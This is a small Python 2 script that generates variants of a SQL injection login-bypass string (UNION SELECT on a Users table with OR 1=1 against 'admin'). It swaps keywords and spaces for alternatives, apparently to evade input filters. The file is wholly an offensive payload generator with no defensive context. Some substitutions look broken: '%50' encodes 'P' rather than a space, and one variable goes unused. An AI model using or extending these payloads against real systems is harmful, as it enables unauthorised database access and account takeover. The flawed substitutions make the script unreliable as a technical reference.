subs = []
values = {" ": "%50", "SELECT": "HAVING", "AND": "&&", "OR": "||"}
originalstring = "' UNION SELECT * FROM Users WHERE username = 'admin' OR 1=1 AND username = 'admin';#"
secondoriginalstring = originalstring
for key, value in values.iteritems():
	if key in originalstring:
		newstring = originalstring.replace(key, value)
		subs.append(newstring)
	if key in secondoriginalstring:	
		secondoriginalstring = secondoriginalstring.replace(key, value)
		subs.append(secondoriginalstring)

subset = set(subs)
for line in subs:
	print line